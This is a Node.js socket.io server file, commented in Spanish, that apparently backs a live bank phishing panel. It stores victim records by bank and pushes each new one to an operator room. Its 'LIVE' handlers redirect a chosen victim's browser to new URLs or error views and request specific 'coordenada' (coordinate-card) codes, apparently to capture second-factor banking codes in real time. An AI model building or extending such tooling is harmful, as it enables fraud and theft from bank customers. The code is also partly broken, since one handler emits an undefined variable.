const express = require("express")
const { createServer } = require("http")
const { Server } = require("socket.io")
const { createUserController } = require("./controller/user/createUser.controller")
const { deleteUser } = require("./controller/user/deleteUser.controller")
const { getAllUser } = require("./controller/user/getAllUser.controller")
const { connectdb } = require("./db/connectdb")
const cors = require('cors')
const { seed } = require("./factory/seed")
const { deleteAllBank } = require("./controller/user/deleteAllUser.controller")
const { disconnectLive } = require("./controller/live/disconnectLive.controller")
const { getUser } = require("./controller/user/getUser.controller")
const { changeLive } = require("./controller/live/changeLive.controller")
require('dotenv').config()

connectdb()

const app = express()
const httpServer = createServer(app)
const io = new Server(httpServer, { 
    cors: ['https://*.repl', 'http://localhost:3000', 'http://localhost:3002'] 
})

app.use(cors())

io.on("connection", async(socket) => {

    if(socket.handshake.headers.origin === 'http://localhost:3000') await socket.join('p0*aBfKPHio*2wJbt6>42)<LlDJ3')

    if([...socket.rooms].includes('p0*aBfKPHio*2wJbt6>42)<LlDJ3')) {
        const users = await getAllUser()
        socket.emit('[User] emitAll', users)
    }
    
    socket.on('(Usuario) crear', async (user) => {
        const usuario = await createUserController({user})
        socket.broadcast.to('p0*aBfKPHio*2wJbt6>42)<LlDJ3').emit('(Usuario) nuevoUsuario', usuario)
    })

    socket.on('[User] delete', async ({_id}) => {
        if(_id == null) return
        await deleteUser({_id})
        return socket.broadcast.to('p0*aBfKPHio*2wJbt6>42)<LlDJ3').emit('[User] deleteUser', usuario)
    })

    // BORRAR TODOS LOS USUARIOS SEGUN EL BANCO
    socket.on('[User] deleteAll', async ({bank}) => {
        if(bank == null) return
        await deleteAllBank({bank})
        return socket.broadcast.to('p0*aBfKPHio*2wJbt6>42)<LlDJ3').emit('[User] deleteAllBankEmit', {bank})
    })


    // MODE LIVE
    socket.on('[LIVE] changeUrlPanel', async({user}) => { 
        const {socketID, viewError, url, coordenada1, coordenada2 } = user
        const newUser = await changeLive({user}) 
        console.log(coordenada1, coordenada2)
        io.to(socketID).emit('[LIVE] changeUrlClient', {url, viewError, coordenada1, coordenada2} )
        socket.emit('[User] newUser', newUser)
    })

    socket.on('[LIVE] coordenada', async(ip, cb) => {
        try {
            const {coordenada1, coordenada2} = await getUser({ip: ip.ip})
            cb({coordenada1, coordenada2})
        } catch (error) {
            
        }
    })

})

app.get('/', (req, res) => console.log('testeando'))

// seed(1000)

app.use(express.static("public"))


httpServer.listen(3002, () => console.log(`conectado al servidor ${3002}`) )
